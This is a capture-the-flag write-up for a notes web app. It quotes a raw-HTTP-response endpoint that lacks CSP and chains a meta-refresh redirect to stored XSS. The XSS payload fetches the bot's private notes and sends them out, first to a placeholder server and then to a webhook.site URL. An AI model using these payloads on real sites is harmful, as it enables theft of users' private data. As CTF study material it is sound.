#metaredirect -> xss

- attempting xss via html injection is blocked by csp
- bug in the server endpoint responsible for serving notes(/api/notes/:noteID)
- constructed a raw http response and send it to res.socket.send()
```js
router.get('/:noteId', async (req, res) => {
  const { noteId } = req.params;
  try {
    const note = await Note.findById(noteId);
    if (!note) {
      return res.status(404).json({ message: 'Note not found' });
    }

    // Look mom, I wrote a raw HTTP response all by myself!
    // Can I go outside now and play with my friends?
    const responseMessage = `HTTP/1.1 200 OK
Date: Sun, 7 Nov 1917 11:26:07 GMT
Last-Modified: the-second-you-blinked
Type: flag-extra-salty, thanks
Length: 1337 bytes of pain
Server: thehackerscrew/1970 
Cache-Control: never-ever-cache-this
Allow: pizza, hugs, high-fives
X-CTF-Player-Reminder: drink-water-and-keep-hydrated

${note.title}: ${note.content}

`
    res.socket.end(responseMessage)
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'Server error' });
  }
});
```
- so in the api endpoint, no CSP and content-type not defined.

- Create two notes:

Note B:
- payload that will execute the XSS, fetching the bot's private notes (which contain the flag) and exfiltrating them to an attacker-controlled server

payload for noteB:
```
<script>
// Replace YOUR_SERVER with your actual exfiltration domain
fetch('/api/notes') 
  .then(response => response.text()) 
  .then(data => fetch('https://YOUR_SERVER/exfil?data=' + encodeURIComponent(data)));
</script>
```
keep a note of the note id of noteB, lets say (NoteB_ID)

Note A:
- The payload utilizes the `<meta>` tag with an `http-equiv="refresh"` directive to achieve an immediate, forced client-side redirect.

payload for noteA:
```
<meta http-equiv="refresh" content="0; url=/api/notes/NoteB_ID">
```

Report and Exploit
1. The attacker reports Note A to the bot.
2. The bot navigates to the CSP-protected page hosting Note A.
3. The `<meta>` redirect within Note A immediately forces the bot's browser to navigate to the endpoint /api/notes/NoteB_ID.
4. The server serves the content of Note B from the vulnerable endpoint, which is lacking the CSP header.
5. The HTML/JavaScript payload in Note B executes without restriction, fetches the bot's private notes containing the flag, and exfiltrates them to the attacker's server



```
<script>
fetch('/api/notes') 
  .then(response => response.text()) 
  .then(data => fetch('https://webhook.site/b5438d11-cc1a-4606-9ed8-24eb8e8a1567/exfil?data=' + encodeURIComponent(data)));
</script>

noteB_id: 74943c76-b832-4cb7-934e-6f852a998d8f

<meta http-equiv="refresh" content="0; url=/api/notes/74943c76-b832-4cb7-934e-6f852a998d8f">

```